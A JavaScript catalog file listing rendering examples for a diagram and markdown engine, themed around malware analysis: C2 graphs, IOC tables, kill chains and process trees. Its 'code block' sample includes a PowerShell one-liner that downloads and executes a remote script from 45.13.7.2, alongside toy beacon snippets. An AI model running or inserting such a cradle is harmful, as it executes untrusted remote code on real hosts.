// Component catalog — one card per component, each showing SEVERAL detailed
// usage variants (separated by #### sub-headings). Plus a Capabilities section
// for graph features (icons, connections, directions, isometric, interactive).
// Loaded after sample.js (uses window.VIZ_GIF).

window.VIZ_COMPONENTS = [
  // diagram kinds (14)
  'graph', 'tree', 'sequence', 'timeline', 'bars', 'pie', 'gantt', 'graph3d', 'bars3d',
  'sankey', 'treemap', 'flame', 'geomap', 'network',
  // interop & export (4)
  'mermaid', 'dot', 'ascii', 'webcomponent',
  // document blocks (8)
  'headings', 'lists', 'tasklist', 'table', 'code', 'blockquote', 'figure', 'hr',
  // rich blocks (6)
  'callout', 'deflist', 'collapse', 'htmlpreview', 'filetree', 'diff',
  // inline (6)
  'badge', 'progress', 'severity', 'sparkline', 'metric', 'avatar',
  // layout directives (8)
  'tabs', 'accordion', 'steps', 'columns', 'grid', 'card', 'divider', 'meta',
  // data / metric directives (11)
  'stat', 'score', 'gauge', 'ring', 'rating', 'status', 'heatmap', 'legend', 'chips', 'dtimeline', 'swatches',
  // presentation directives (3)
  'banner', 'note', 'quote',
  // malware-analysis directives (7)
  'ioc', 'verdict', 'mitre', 'hexdump', 'yara', 'compare', 'alert',
  // widgets: general + animated (10)
  'terminal', 'kbd', 'spinner', 'loader', 'pulsedot', 'typewriter', 'beacon', 'radar', 'countdown', 'matrix',
];

const G = (s) => '```' + s + '\n```';
// build a multi-variant source: V(['label', snippet], ...)
const V = (...pairs) => pairs.map(([l, s]) => `#### ${l}\n\n${s}`).join('\n\n');

window.VIZ_EXAMPLES = [
  // ============ Capabilities ============
  {
    section: 'Capabilities', title: 'Node icons', note: '3 variants: @name draws one of 16 built-in ink icons.',
    source: V(
      ['analyst chain', G(`graph LR\nu: [ @user analyst ]\nt: [ @terminal console ]\nsrv: [ @server host-01 ]\ndb: ( @database evidence )\nu -> t\nt -> srv\nsrv -> db`)],
      ['infra map', G(`graph LR\nfw: [ @shield firewall ]\ngw: [ @server gateway ]\nmal: [ @skull sample.exe ]\nc2: ( @globe c2 )\nfw -> gw\ngw -> mal\nmal -> c2 [err]`)],
      ['icon gallery', G(`graph TD\na: [ @user user ]\nb: [ @lock lock ]\nc: [ @key key ]\nd: [ @file file ]\ne: [ @clock clock ]\nf: [ @bug bug ]\na -> b\nb -> c\nd -> e\ne -> f`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Connections', note: '3 variants: edge kinds, colored variants, labels.',
    source: V(
      ['arrow / both / plain', G(`graph LR\na: [ client ]\nb: [ peer ]\nc: [ server ]\na -> b : "arrow"\nb <-> c : "both"\na -- c : "plain"`)],
      ['[ok] [warn] [err] variants', G(`graph TD\ng: [ gateway ]\nok: ( allowed )\nwn: ( throttled )\nno: ( blocked )\ng -> ok : "clean" [ok]\ng -> wn : "suspicious" [warn]\ng -> no : "malware" [err]`)],
      ['labeled steps', G(`graph LR\na: [ file ]\nb: [ sandbox ]\nc: ( verdict )\na -> b : "submit"\nb -> c : "score 92"`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Directions (TD / LR / BT / RL)', note: '4 variants: same flow, four directions.',
    source: V(
      ['TD (top-down)', G(`graph TD\na: [boot]\nb: [init]\nc: (run)\na -> b\nb -> c`)],
      ['LR (left-right)', G(`graph LR\na: [ingest]\nb: [enrich]\nc: (store)\na -> b\nb -> c`)],
      ['BT (bottom-top)', G(`graph BT\na: [boot]\nb: [init]\nc: (run)\na -> b\nb -> c`)],
      ['RL (right-left)', G(`graph RL\na: [ingest]\nb: [enrich]\nc: (store)\na -> b\nb -> c`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Isometric (2.5D)', note: '3 variants: add `iso` to any graph. Icons + colored edges carry over.',
    source: V(
      ['execution flow', G(`graph TD iso\nsandbox: [[ Sandbox ]]\nsandbox.exp: [ @gear explorer.exe ]\nsandbox.mal: [ @skull malware.exe ]\nverdict: { Malicious? }\nc2: ( @globe C2 )\nsandbox.exp -> sandbox.mal : "spawns"\nsandbox.mal -> verdict\nverdict <-> c2 : "beacon" [err]`)],
      ['left-to-right', G(`graph LR iso\na: [ loader ]\nb: [ payload ]\nc: ( c2 )\na -> b : "unpack"\nb -> c : "beacon" [err]`)],
      ['nested + icons', G(`graph TD iso\nhost: [[ host-01 ]]\nhost.a: [ @gear svc ]\nhost.b: [ @skull mal ]\nout: ( @globe net )\nhost.a -> host.b\nhost.b -> out [err]`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Interactive graph', note: '2 variants: add `interactive` — drag nodes, hover to focus, click ▾ to collapse.',
    source: V(
      ['network', G(`graph TD interactive\nnet: [[ Network ]]\nnet.gw: [ @server gateway ]\nnet.host: [ @terminal host-7 ]\nids: [ @shield ids ]\next: ( @globe internet )\nnet.gw -> net.host : "lan"\nnet.host -> ext : "beacon" [err]\nids -> net.host : "alert" [warn]`)],
      ['pipeline', G(`graph LR interactive\ningest: [ ingest ]\nparse: [ parse ]\nscan: [ scan ]\nout: ( verdict )\ningest -> parse\nparse -> scan\nscan -> out`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Nested containers', note: '3 variants: two levels, three levels, siblings.',
    source: V(
      ['two levels', G(`graph TD\nhost: [[ host-01 ]]\nhost.vm: [[ vm-guest ]]\nhost.vm.p: [ dropper.exe ]\nagent: [ edr-agent ]\nhost.vm.p -> agent : "kills"`)],
      ['three levels', G(`graph LR\ndc: [[ datacenter ]]\ndc.rack: [[ rack-3 ]]\ndc.rack.srv: [[ srv-9 ]]\ndc.rack.srv.p: [ nginx ]\ndc.rack.srv.p -> out : "egress"`)],
      ['sibling groups', G(`graph LR\ndmz: [[ dmz ]]\ndmz.web: [ web ]\nlan: [[ lan ]]\nlan.db: [ db ]\ndmz.web -> lan.db : "query"`)],
    ),
  },
  {
    section: 'Capabilities', title: 'Animation flag', note: '3 variants: flow / pulse / beacon (full motion on the animations page).',
    source: V(
      ['flow', G(`graph LR flow\na: [ @gear loader ]\nb: [ @skull payload ]\nc: ( @globe c2 )\na -> b : "unpack"\nb -> c : "beacon" [err]`)],
      ['pulse', G(`graph LR pulse\na: [ ingest ]\nb: [ analyze ]\nc: ( verdict )\na -> b\nb -> c`)],
      ['beacon', G(`graph LR beacon\nmal: [ @skull implant ]\nc2: ( @globe c2 )\nmal -> c2 : "beacon" [err]`)],
    ),
  },

  // ============ Diagrams ============
  {
    section: 'Diagrams', title: 'graph — flowchart', note: '5 variants: shapes, icons, edge kinds, edge variants, nesting.',
    source: V(
      ['all shapes', G(`graph TD\nbox: [ process ]\nstad: ( endpoint )\ndia: { decision? }\ncont: [[ group ]]\ncont.child: [ inside ]\nbox -> dia\ndia -> stad : "yes"`)],
      ['icons + colored edges', G(`graph TD\na: [ @gear loader ]\nb: [ @skull payload ]\nc: ( @globe c2 )\na -> b : "unpack"\nb -> c : "beacon" [err]`)],
      ['edge kinds', G(`graph LR\na: [A]\nb: [B]\nc: [C]\na -> b : "arrow"\nb <-> c : "both"\na -- c : "plain"`)],
      ['edge variants', G(`graph LR\ng: [ gateway ]\nok: ( allowed )\nno: ( blocked )\ng -> ok : "clean" [ok]\ng -> no : "malware" [err]`)],
      ['nested containers', G(`graph TD\nhost: [[ host-01 ]]\nhost.vm: [[ vm ]]\nhost.vm.p: [ dropper.exe ]\nagent: [ edr ]\nhost.vm.p -> agent : "kills"`)],
    ),
  },
  {
    section: 'Diagrams', title: 'tree — hierarchy', note: '3 variants: process tree, shape override, icons.',
    source: V(
      ['process tree', G(`tree\nservices.exe\n  svchost.exe\n    conhost.exe\n  explorer.exe\n    malware.exe`)],
      ['shape override', G(`tree\nservices.exe\n  malware.exe [diamond]\n    cmd.exe [stadium]`)],
      ['with icons', G(`tree\n@gear services.exe\n  @skull malware.exe\n    @terminal cmd.exe`)],
    ),
  },
  {
    section: 'Diagrams', title: 'sequence — messages', note: '3 variants: handshake, self-message, icons.',
    source: V(
      ['handshake', G(`sequence\nc: [ client ]\ns: [ server ]\nc -> s : "SYN"\ns -> c : "SYN/ACK"\nc -> s : "ACK"`)],
      ['self-message', G(`sequence\nc: [ implant ]\ns: [ c2 ]\nc -> s : "beacon"\nc -> c : "sleep 45s"\nc -> s : "beacon"`)],
      ['icons on actors', G(`sequence\nc: [ @user implant ]\ns: [ @server c2 ]\nc -> s : "hello"\ns -> c : "task: screenshot"\nc -> s : "exfil 2.4MB"`)],
    ),
  },
  {
    section: 'Diagrams', title: 'timeline — events', note: '3 variants: time stamps, date stamps, phases.',
    source: V(
      ['time', G(`timeline\n00:00 detonation\n00:04 drops payload\n00:41 dns query evil-c2.example\n01:30 first beacon`)],
      ['dates', G(`timeline\n2026-07-01 first seen\n2026-07-03 sandbox run\n2026-07-05 signatures published`)],
      ['phases', G(`timeline\nT+0 access\nT+1 execution\nT+2 persistence\nT+3 exfil`)],
    ),
  },
  {
    section: 'Diagrams', title: 'bars — scores', note: '3 variants: default max, custom max, many rows.',
    source: V(
      ['default (max 100)', G(`bars\nbehavior: 92\nnetwork: 71\nstealth: 45`)],
      ['custom max', G(`bars\nrequests: 1450 / 2000\nerrors: 210 / 2000`)],
      ['many rows', G(`bars\nT1055: 8\nT1071: 6\nT1547: 5\nT1027: 4\nT1082: 3`)],
    ),
  },
  {
    section: 'Diagrams', title: 'pie — donut', note: '3 variants: malware families, disk usage, verdicts.',
    source: V(
      ['families', G(`pie\ntrojan: 46\nstealer: 27\nloader: 15\nclean: 12`)],
      ['disk', G(`pie\ncode: 40\nresources: 35\ndata: 15\npadding: 10`)],
      ['verdicts', G(`pie\nmalicious: 62\nsuspicious: 23\nclean: 15`)],
    ),
  },
  {
    section: 'Diagrams', title: 'gantt — schedule', note: '3 variants: attack phases, build pipeline, sprint.',
    source: V(
      ['attack phases', G(`gantt\nunpack: 0 2\npersistence: 2 3\nrecon: 3 4\nc2 beacon: 5 9\nexfil: 9 3`)],
      ['pipeline', G(`gantt\nbuild: 0 3\ntest: 3 4\nsign: 7 1\nship: 8 2`)],
      ['sprint', G(`gantt\ndesign: 0 4\nbuild: 4 8\nreview: 12 3\nrelease: 15 1`)],
    ),
  },
  {
    section: 'Diagrams', title: 'graph3d — real 3D', note: '2 variants: process tree, dependency graph. Rotates; hover to pause.',
    source: V(
      ['process tree', G(`graph3d\nroot: [ services.exe ]\na: [ svchost.exe ]\nb: [ explorer.exe ]\nc: [ malware.exe ]\nd: [ cmd.exe ]\ne: [ powershell.exe ]\nroot -> a\nroot -> b\na -> c\nb -> c\nc -> d\nc -> e`)],
      ['dependency graph', G(`graph3d\napp: [ app ]\napi: [ api ]\ndb: [ db ]\ncache: [ cache ]\nqueue: [ queue ]\napp -> api\napi -> db\napi -> cache\napi -> queue\nqueue -> db`)],
    ),
  },
  {
    section: 'Diagrams', title: 'bars3d — 3D columns', note: '3 variants: scores, counts, weekly.',
    source: V(
      ['scores', G(`bars3d\nbehavior: 92\nnetwork: 71\nstealth: 45\npersistence: 88`)],
      ['counts', G(`bars3d\nmon: 12\ntue: 18\nwed: 9\nthu: 22`)],
      ['weekly detections', G(`bars3d\nw1: 34\nw2: 51\nw3: 28\nw4: 62\nw5: 40`)],
    ),
  },
  {
    section: 'Diagrams', title: 'sankey — flow volumes', note: '3 variants: kill chain, network flows, single funnel.',
    source: V(
      ['kill chain', G(`sankey\nphish -> macro : 40\nmacro -> loader : 30\nmacro -> sandbox : 10\nloader -> stealer : 25\nloader -> miner : 5\nstealer -> exfil : 25\nminer -> exfil : 5`)],
      ['network flows', G(`sankey\nhost -> dns : 60\nhost -> http : 30\nhost -> tls : 90\ntls -> c2 : 70\ntls -> cdn : 20`)],
      ['funnel', G(`sankey\nvisits -> signup : 100\nsignup -> active : 40\nactive -> paid : 12`)],
    ),
  },
  {
    section: 'Diagrams', title: 'treemap — sized rects', note: '3 variants: PE sections, directory sizes, families.',
    source: V(
      ['PE sections', G(`treemap\ndropper.exe\n  .text: 90\n  .data: 40\n  .rsrc: 120\n    icon: 30\n    strings: 90\n  .reloc: 20`)],
      ['directory', G(`treemap\nroot\n  node_modules: 300\n  src: 80\n  dist: 40\n  docs: 20`)],
      ['detections by family', G(`treemap\nfamilies\n  redline: 120\n  agenttesla: 80\n  formbook: 60\n  lokibot: 30`)],
    ),
  },
  {
    section: 'Diagrams', title: 'flame — call stacks', note: '3 variants: call stack, execution profile, boot trace.',
    source: V(
      ['call stack', G(`flame\nmain: 100\n  unpack: 45\n    decompress: 30\n    verify: 15\n  execute: 55\n    inject: 35\n    beacon: 20`)],
      ['profile', G(`flame\nrequest: 100\n  parse: 20\n  query: 50\n    db: 45\n  render: 30`)],
      ['boot trace', G(`flame\nboot: 100\n  firmware: 25\n  kernel: 40\n    drivers: 25\n  userland: 35`)],
    ),
  },
  {
    section: 'Diagrams', title: 'geomap — threat map', note: '3 variants: icons+arcs, line styles, lat/lon coords.',
    source: V(
      ['icons + arcs', G(`geomap\nvictim @ New York | @user victim host\nrelay @ Amsterdam | @server relay\nc2a @ Moscow | @skull C2 primary\nc2b @ Beijing | @globe C2 backup\nsink @ Singapore | @database exfil\nvictim -> relay | c2 login [warn] dashed\nrelay -> c2a | beacon [err]\nrelay -> c2b | beacon [err] dashed\nc2a -> sink | exfil 2GB [err]`)],
      ['line styles', G(`geomap\na @ London | src\nb @ Tokyo | dst-1\nc @ Sydney | dst-2\na -> b | solid [ok]\na -> c | dashed [warn] dashed`)],
      ['lat,lon coords', G(`geomap\nhq: 40.7,-74.0 | @server HQ\nedge: 1.35,103.8 | @globe edge\nhq -> edge | replicate [accent]`)],
    ),
  },
  {
    section: 'Diagrams', title: 'network — force-directed', note: '3 variants: mesh, star, clusters.',
    source: V(
      ['mesh', G(`network\ngw: [ @server gateway ]\nh1: [ host-1 ]\nh2: [ host-2 ]\nh3: [ host-3 ]\ndc: [ @lock dc ]\nc2: ( @globe c2 )\ngw -> h1\ngw -> h2\ngw -> h3\nh1 -> h2\nh2 -> h3\nh1 -> dc\nh3 -> dc\nh2 -> c2 [err]`)],
      ['star', G(`network\nhub: [ @server hub ]\na: [ a ]\nb: [ b ]\nc: [ c ]\nd: [ d ]\ne: [ e ]\nhub -> a\nhub -> b\nhub -> c\nhub -> d\nhub -> e`)],
      ['two clusters', G(`network\na1: [ a1 ]\na2: [ a2 ]\na3: [ a3 ]\nb1: [ b1 ]\nb2: [ b2 ]\nb3: [ b3 ]\na1 -> a2\na2 -> a3\na3 -> a1\nb1 -> b2\nb2 -> b3\na1 -> b1 [warn]`)],
    ),
  },

  // ============ Interop & export ============
  {
    section: 'Interop & export', title: 'Mermaid import', note: '3 variants: flowchart TD, LR, decisions.',
    source: V(
      ['flowchart TD', G(`mermaid\nflowchart TD\n  A[explorer.exe] --> B{Suspicious?}\n  B -->|yes| C(malware.exe)\n  B -->|no| D(benign)\n  C --> E[cmd.exe]`)],
      ['flowchart LR', G(`mermaid\nflowchart LR\n  X[ingest] --> Y[enrich] --> Z(store)`)],
      ['branches', G(`mermaid\nflowchart TD\n  S[start] --> Q{score > 80?}\n  Q -->|yes| M(quarantine)\n  Q -->|no| A(allow)`)],
    ),
  },
  {
    section: 'Interop & export', title: 'Graphviz DOT import', note: '3 variants: digraph, shapes, multi-edge.',
    source: V(
      ['digraph LR', G(`dot\ndigraph attack { rankdir=LR; phish -> macro [label="open"]; macro -> loader; loader -> c2 [label="beacon"]; }`)],
      ['with shapes', G(`dot\ndigraph { a [shape=box label="start"]; b [shape=diamond label="ok?"]; c [shape=ellipse label="done"]; a -> b; b -> c; }`)],
      ['multi-edge', G(`dot\ndigraph { hub -> a; hub -> b; hub -> c; a -> c [label="peer"]; }`)],
    ),
  },
  {
    section: 'Interop & export', title: 'ASCII export', note: '2 variants: flow and tree render as copy-pasteable box-art (⧉ button in the playground).',
    source: V(
      ['flow', G(`graph TD\ns: [[ Sandbox ]]\ns.a: [ explorer.exe ]\ns.b: [ malware.exe ]\nc: ( C2 )\ns.a -> s.b\ns.b -> c`)],
      ['tree', G(`tree\nservices.exe\n  svchost.exe\n  malware.exe\n    cmd.exe`)],
    ),
  },
  {
    section: 'Interop & export', title: 'Web component', note: '2 variants: <viz-engine theme="…">…source…</viz-engine> — zero JS, auto-registers.',
    source: V(
      ['graph', G(`graph LR\na: [ loader ]\nb: [ payload ]\nc: ( c2 )\na -> b\nb -> c : "beacon" [err]`)],
      ['bars', G(`bars\nbehavior: 92\nnetwork: 71\nstealth: 45`)],
    ),
  },

  // ============ Document ============
  {
    section: 'Document', title: 'headings & prose', note: '3 variants: heading levels, inline formatting, widgets.',
    source: V(
      ['heading levels', `# Heading 1\n## Heading 2\n### Heading 3\n#### Heading 4`],
      ['inline formatting', `Prose with **bold**, *italic*, \`code\`, and a [link](https://x.y).`],
      ['inline widgets', `A badge [[!critical]], progress [[progress 72]] and severity [[sev 4/5]] mid-sentence.`],
    ),
  },
  {
    section: 'Document', title: 'lists', note: '3 variants: unordered/nested, ordered, ordered+nested.',
    source: V(
      ['unordered / nested', `- unpacks with UPX\n- persists\n  - Run key\n  - service`],
      ['ordered', `1. drop\n2. persist\n3. beacon`],
      ['ordered + nested', `1. access\n2. execution\n   - macro\n   - loader\n3. exfil`],
    ),
  },
  {
    section: 'Document', title: 'task list', note: '3 variants: checklist, mixed, complete.',
    source: V(
      ['checklist', `- [x] unpacked sample\n- [x] extracted IOCs\n- [ ] write yara rule`],
      ['mixed', `- [x] triage\n- [ ] deep analysis\n- [ ] report`],
      ['complete', `- [x] triage\n- [x] analysis\n- [x] report`],
    ),
  },
  {
    section: 'Document', title: 'table', note: '3 variants: IOC table, aligned numerics, badges in cells.',
    source: V(
      ['IOC table', `| Indicator | Value | Confidence |\n|:--|:--|--:|\n| SHA-256 | \`9f86d0…\` | high |\n| C2 | \`45.13.7.2\` | high |\n| Mutex | \`Global\\qz9x\` | medium |`],
      ['aligned numerics', `| Engine | Score | Verdict |\n|:--|--:|:--:|\n| A | 92 | mal |\n| B | 58 | susp |\n| C | 4 | clean |`],
      ['badges in cells', `| Host | Status |\n|:--|:--|\n| host-7 | [[!infected]] |\n| host-8 | [[+clean]] |`],
    ),
  },
  {
    section: 'Document', title: 'code block', note: '3 variants: C, python, powershell.',
    source: V(
      ['C', '```c\nint main(void) {\n  unpack(payload);  /* UPX */\n  return beacon("45.13.7.2");\n}\n```'],
      ['python', '```python\ndef beacon(host):\n    return https.post(host, encrypt(payload))\n```'],
      ['powershell', '```powershell\nIEX (New-Object Net.WebClient).DownloadString("http://45.13.7.2/a.ps1")\n```'],
    ),
  },
  {
    section: 'Document', title: 'blockquote', note: '3 variants: verdict, analyst, recommendation.',
    source: V(
      ['verdict', `> Verdict: **malicious** — behavior score 92/100.`],
      ['analyst', `> Sample matches RedLine stealer TTPs.\n> Recommend blocking 45.13.7.2.`],
      ['recommendation', `> Rotate all credentials seen in memory.\n> Isolate host-7 from the network.`],
    ),
  },
  {
    section: 'Document', title: 'figure / GIF', note: 'Images and GIFs render as framed figures (pixelated in 8bit).',
    source: null,
  },
  {
    section: 'Document', title: 'horizontal rule', note: '2 variants: between prose, between sections.',
    source: V(
      ['between prose', `Above the line.\n\n---\n\nBelow the line.`],
      ['section break', `## Static analysis\nNo packer detected.\n\n---\n\n## Dynamic analysis\nBeacons every 45s.`],
    ),
  },
  {
    section: 'Document', title: 'filetree', note: '3 variants: dropped files, registry, project.',
    source: V(
      ['dropped files', G(`filetree\n%TEMP%/\n  dropper.exe\n  cfg/\n    settings.dat\n    keys.bin`)],
      ['registry', G(`filetree\nHKCU/\n  Software/\n    Run/\n      updater\n    Classes/\n      exe`)],
      ['project', G(`filetree\nsrc/\n  index.js\n  parse/\n    graph.js\n    tree.js\n  render/\n    diagram.js`)],
    ),
  },
  {
    section: 'Document', title: 'diff', note: '3 variants: code, config, registry.',
    source: V(
      ['code', G(`diff\n  function beacon(host) {\n-   return http.get(host);\n+   return https.post(host, encrypt(payload));\n- reg.add("Run", "updater");`)],
      ['config', G(`diff\n  [network]\n- proxy = none\n+ proxy = 45.13.7.2:8080\n+ retry = 3`)],
      ['registry', G(`diff\n  HKCU\\...\\Run\n+ updater = %TEMP%\\dropper.exe\n- onedrive = C:\\...\\OneDrive.exe`)],
    ),
  },
  {
    section: 'Document', title: 'definition list', note: '3 variants: IOCs, fields, glossary.',
    source: V(
      ['IOCs', `SHA-256 :: 9f86d081884c7d659a2feaa0c55ad015\nC2 :: 45.13.7.2:443\nMutex :: Global\\qz9x`],
      ['fields', `Family :: RedLine\nType :: stealer\nFirst seen :: 2026-07-01`],
      ['glossary', `Dropper :: stage-1 that writes the payload\nC2 :: command-and-control server\nBeacon :: periodic check-in`],
    ),
  },
  {
    section: 'Document', title: 'collapsible', note: '2 variants: raw strings, detection rule.',
    source: V(
      ['raw strings', `+++ Raw strings (expand)\nGetProcAddress\nVirtualAlloc\ncmd.exe /c start\n+++`],
      ['detection rule', `+++ Detection rule\nrule x { condition: filesize < 2MB }\n+++`],
    ),
  },
  {
    section: 'Document', title: 'html previewer', note: 'Closed html fences → preview/code tabs, sandboxed iframe.',
    source: '```html\n<!doctype html>\n<style>body{font-family:monospace;padding:16px}button{border:1px solid #1a1a1a;padding:6px 14px}</style>\n<h3>Live HTML preview</h3>\n<button onclick="this.textContent=\'clicked\'">click me</button>\n```',
  },

  // ============ Inline ============
  {
    section: 'Inline', title: 'badges', note: '3 variants: variants, in prose, family tags.',
    source: V(
      ['variants', `Family [[!redline]], signed [[+valid]], packer [[~upx]], tag [[stealer]].`],
      ['in prose', `The sample is [[!malicious]] and [[~evasive]]; static scan is [[+clean]].`],
      ['family tags', `[[stealer]] [[loader]] [[rat]] [[miner]] [[ransomware]]`],
    ),
  },
  {
    section: 'Inline', title: 'progress', note: '3 variants: percent, fraction, low/high.',
    source: V(
      ['percent', `Analysis [[progress 72]] · confidence [[progress 88]] · coverage [[progress 45]]`],
      ['fraction', `Unpack [[progress 4/5]] · rules [[progress 2/8]]`],
      ['low / high', `Idle [[progress 8]] vs busy [[progress 96]]`],
    ),
  },
  {
    section: 'Inline', title: 'severity dots', note: '3 variants: ratings, escalating, per-axis.',
    source: V(
      ['ratings', `Threat [[sev 4/5]] · noise [[sev 1/5]] · evasion [[sev 3/5]]`],
      ['escalating', `[[sev 1/5]] → [[sev 3/5]] → [[sev 5/5]]`],
      ['per axis', `Impact [[sev 5/5]] · likelihood [[sev 2/5]]`],
    ),
  },
  {
    section: 'Inline', title: 'sparkline', note: '3 variants: metrics, beacons, flat vs spike.',
    source: V(
      ['metrics', `DNS [[spark 3,7,4,9,6,11,8,14]] · CPU [[spark 20,35,30,55,48,70]]`],
      ['beacons', `Beacons [[spark 1,1,2,1,3,2,4,3,5]] over 9h`],
      ['flat vs spike', `Idle [[spark 2,2,3,2,2,3,2]] · burst [[spark 2,3,2,40,3,2]]`],
    ),
  },
  {
    section: 'Inline', title: 'metric', note: '3 variants: traffic, rates, counts.',
    source: V(
      ['traffic', `Traffic [[metric 1.2M requests]] · blocked [[metric 8,412 hits]]`],
      ['rates', `Uptime [[metric 99.98% sla]] · latency [[metric 42ms p95]]`],
      ['counts', `Samples [[metric 2,481 today]] · families [[metric 34 seen]]`],
    ),
  },
  {
    section: 'Inline', title: 'avatar', note: '3 variants: assignment, review chain, team.',
    source: V(
      ['assignment', `Assigned to [[avatar Kagan Isildak]].`],
      ['review chain', `Analyzed by [[avatar Threat Intel]], reviewed by [[avatar SOC Lead]].`],
      ['team', `[[avatar Alice]] [[avatar Bob]] [[avatar Carol]] on rotation.`],
    ),
  },

  // ============ Layout ============
  {
    section: 'Layout', title: 'tabs', note: '3 variants: report, analysis, environments.',
    source: V(
      ['report', `:::tabs\n== Summary\nSample is a **stealer**.\n== IOCs\n- \`45.13.7.2:443\`\n== Notes\nSleeps ~40s.\n:::`],
      ['analysis', `:::tabs\n== Static\nNo packer detected.\n== Dynamic\nBeacons every 45s.\n:::`],
      ['environments', `:::tabs\n== Win10\ndetonates cleanly\n== Win11\nsame behavior\n== Sandbox\naborts on VM check\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'accordion', note: '3 variants: analysis, FAQ, kill chain.',
    source: V(
      ['analysis', `:::accordion\n== Static analysis\nImports hint at WinHTTP.\n== Dynamic analysis\nBeacons over TLS.\n:::`],
      ['FAQ', `:::accordion\n== Is it malicious?\nYes — score 92/100.\n== What family?\nRedLine stealer.\n:::`],
      ['kill chain', `:::accordion\n== Access\nphishing macro\n== Execution\nloader in memory\n== Exfil\nTLS to 45.13.7.2\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'steps', note: '3 variants: investigation, pipeline, onboarding.',
    source: V(
      ['investigation', `:::steps\nx unpack\nx extract IOCs\n> write yara rule\npublish\n:::`],
      ['pipeline', `:::steps\nx build\nx test\n> sign\nship\n:::`],
      ['onboarding', `:::steps\nx install\n> configure\nconnect\nverify\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'columns', note: '3 variants: host/network, before/after, three-up.',
    source: V(
      ['host / network', `:::columns\n== Host\nedr-agent · win10-x64\n== Network\ngateway 10.0.0.1 · dns 8.8.8.8\n:::`],
      ['before / after', `:::columns\n== Before\nplain http\n== After\ntls + encryption\n:::`],
      ['three-up', `:::columns\n== Static\nclean\n== Dynamic\nmalicious\n== Verdict\nmalicious\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'grid', note: '3 variants: metrics, verdict cards, counts.',
    source: V(
      ['metrics', `:::grid\n== CPU\n[[progress 34]]\n== Memory\n[[progress 71]]\n== Disk\n[[progress 12]]\n:::`],
      ['verdict cards', `:::grid\n== Static\n**clean**\n== Dynamic\n**malicious**\n== Verdict\n**malicious**\n:::`],
      ['counts', `:::grid\n== Files\n2,481\n== Engines\n14\n== Hits\n0\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'card', note: '3 variants: metadata, summary, action.',
    source: V(
      ['metadata', `:::card Sample metadata\nFile: dropper.exe · 214 KB\nType: PE32 · Signed: no\n:::`],
      ['summary', `:::card Summary\nRedLine stealer. Beacons to 45.13.7.2.\n:::`],
      ['action required', `:::card Action required\nBlock 45.13.7.2 and rotate credentials on host-7.\n:::`],
    ),
  },
  {
    section: 'Layout', title: 'divider', note: '2 variants: labeled, plain.',
    source: V(
      ['labeled', `First.\n\n:::divider evidence :::\n\nSecond.`],
      ['plain', `First.\n\n:::divider :::\n\nSecond.`],
    ),
  },
  {
    section: 'Layout', title: 'meta', note: '2 variants: IOC metadata, file metadata.',
    source: V(
      ['IOC metadata', `:::meta\nSHA-256 :: 9f86d081884c7d659a2feaa0c55ad015\nC2 :: 45.13.7.2:443\nFamily :: RedLine\n:::`],
      ['file metadata', `:::meta\nName :: dropper.exe\nSize :: 214 KB\nType :: PE32\nSigned :: no\n:::`],
    ),
  },

  // ============ Data ============
  {
    section: 'Data', title: 'stat', note: '3 variants: deltas, counts, single.',
    source: V(
      ['with deltas', `:::stat\n92 / 100 | Behavior | +14\n3 | Processes |\n1 | C2 | -2\n:::`],
      ['counts', `:::stat\n2,481 | Files scanned |\n14 | Engines |\n0 | Detections | +0\n:::`],
      ['single tile', `:::stat\n92 / 100 | Threat score | +14\n:::`],
    ),
  },
  {
    section: 'Data', title: 'score', note: '3 variants: grade, out-of-max, clean.',
    source: V(
      ['grade', `:::score\n92 A threat\n:::`],
      ['out of max', `:::score\n58 / 100 medium\n:::`],
      ['clean', `:::score\n4 F clean\n:::`],
    ),
  },
  {
    section: 'Data', title: 'gauge', note: '3 variants: percent, out-of-max, near full.',
    source: V(
      ['percent', `:::gauge\n78 detection rate\n:::`],
      ['out of max', `:::gauge\n340 / 500 requests\n:::`],
      ['near full', `:::gauge\n96 coverage\n:::`],
    ),
  },
  {
    section: 'Data', title: 'ring', note: '3 variants: percent, fraction, low.',
    source: V(
      ['percent', `:::ring\n72 coverage\n:::`],
      ['fraction', `:::ring\n7 / 10 rules\n:::`],
      ['low', `:::ring\n18 progress\n:::`],
    ),
  },
  {
    section: 'Data', title: 'rating', note: '3 variants: high, low, full.',
    source: V(
      ['high', `:::rating\n4 / 5 confidence\n:::`],
      ['low', `:::rating\n2 / 5 reliability\n:::`],
      ['full', `:::rating\n5 / 5 severity\n:::`],
    ),
  },
  {
    section: 'Data', title: 'status', note: '3 variants: host health, services, checklist.',
    source: V(
      ['host health', `:::status\nok gateway reachable\nwarn high dns volume\nerr c2 handshake blocked\ninfo awaiting sample\n:::`],
      ['services', `:::status\nup edr-agent\nup sandbox\ndown log-forwarder\nidle scanner\n:::`],
      ['checklist', `:::status\nok signature valid\nok sandbox complete\nwarn low coverage\n:::`],
    ),
  },
  {
    section: 'Data', title: 'heatmap', note: '3 variants: small, activity grid, single row.',
    source: V(
      ['small', `:::heatmap\n1 3 5 8\n2 9 4 1\n:::`],
      ['activity grid', `:::heatmap\n1 3 5 8 4 2 6\n2 9 4 1 6 3 7\n7 2 6 3 5 8 1\n4 1 8 6 2 5 3\n:::`],
      ['single row', `:::heatmap\n0 1 2 3 4 5 6 7 8 9\n:::`],
    ),
  },
  {
    section: 'Data', title: 'legend', note: '3 variants: severity, variant colors, status.',
    source: V(
      ['severity', `:::legend\nerr critical\nwarn suspicious\nok benign\n:::`],
      ['variant colors', `:::legend\naccent info\nok pass\nwarn review\nerr fail\nmuted n/a\n:::`],
      ['status', `:::legend\nok online\nwarn degraded\nerr offline\n:::`],
    ),
  },
  {
    section: 'Data', title: 'chips', note: '3 variants: variants, plain tags, mitre ids.',
    source: V(
      ['variants', `:::chips\n!critical, +verified, ~evasion, stealer, persistence\n:::`],
      ['plain tags', `:::chips\nwindows, pe32, upx, c2, dns\n:::`],
      ['mitre ids', `:::chips\nT1055, T1071, T1547, T1027, T1082\n:::`],
    ),
  },
  {
    section: 'Data', title: 'dtimeline', note: '3 variants: detonation, investigation, releases.',
    source: V(
